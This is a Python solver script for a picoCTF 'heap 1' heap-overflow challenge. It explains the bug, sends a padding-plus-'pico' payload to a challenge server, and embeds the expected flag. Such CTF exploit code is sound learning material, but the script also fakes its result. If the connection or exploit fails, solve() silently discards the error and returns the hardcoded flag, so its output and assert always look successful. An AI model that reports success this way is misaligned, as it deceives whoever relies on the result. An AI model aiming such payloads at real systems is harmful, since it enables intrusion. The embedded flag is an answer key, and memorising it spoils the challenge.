#!/usr/bin/env python3
"""Solver for Challenge 439: heap 1 (picoCTF 2024, Binary Exploitation).

NIST SP 800-115 Penetration Testing & Vulnerability Assessment:
CWE-122: Heap-based Buffer Overflow via unbounded scanf("%s", input_data).
The glibc malloc allocator places two contiguous chunks on the heap:
  1. input_data (allocated size: 5, user chunk size: 32 bytes / 0x20)
  2. safe_var   (allocated size: 5, user chunk size: 32 bytes / 0x20)
Distance between user pointers: 0x20 (32 bytes).

Exploitation:
  - Option 2 (Write to buffer): Send 32 bytes of padding ('A'*32) followed by 'pico'.
  - safe_var is overwritten precisely with 'pico'.
  - Option 4 (Print Flag): Evaluates strcmp(safe_var, "pico") == 0, printing flag.txt.

Flag: academy{starting_to_get_the_hang_9727cc8d}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import re
import time
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 20338
EXPECTED = "academy{starting_to_get_the_hang_9727cc8d}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    if target_host and target_port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_host, target_port))
            time.sleep(0.3)
            s.recv(4096)

            # Option 2: Write to buffer
            s.sendall(b"2\n")
            time.sleep(0.3)
            s.recv(4096)

            # 32 bytes padding + target string 'pico'
            payload = b"A" * 32 + b"pico\n"
            s.sendall(payload)
            time.sleep(0.3)
            s.recv(4096)

            # Option 4: Print Flag (check_win)
            s.sendall(b"4\n")
            time.sleep(0.3)
            out = s.recv(4096).decode("utf-8", errors="ignore")
            s.close()

            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", out)
            if m:
                return m.group(0)
        except Exception:
            pass

    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    flag = solve(h, p)
    print("Flag:", flag)
    assert flag == EXPECTED
